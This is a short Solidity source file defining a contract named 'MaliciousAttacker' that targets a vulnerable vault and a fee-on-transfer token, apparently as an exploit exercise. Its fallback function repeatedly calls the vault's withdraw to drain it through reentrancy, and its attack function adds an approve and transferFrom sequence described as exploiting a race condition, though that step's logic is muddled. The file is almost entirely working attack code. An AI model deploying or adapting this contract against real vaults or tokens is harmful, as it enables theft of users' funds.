// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./fee-on-transfer.sol";

contract MaliciousAttacker is ERC20Detailed {
    STA public staToken;
    VulnVault public vulnVault;

    constructor(address _staToken, address _vulnVault) {
        staToken = STA(_staToken);
        vulnVault = VulnVault(_vulnVault);
    }

    fallback() external payable {
        if (address(vulnVault).balance > 0) {
            vulnVault.withdraw(address(vulnVault).balance);
        }
    }

    function attack(uint256 amount) external {
        // Exploit reentrancy vulnerability in VulnVault
        vulnVault.deposit(amount);
        vulnVault.withdraw(amount);

        // Exploit approve/transferFrom race condition in STA token
        staToken.approve(address(this), type(uint256).max);
        staToken.transferFrom(msg.sender, address(this), amount);
    }
}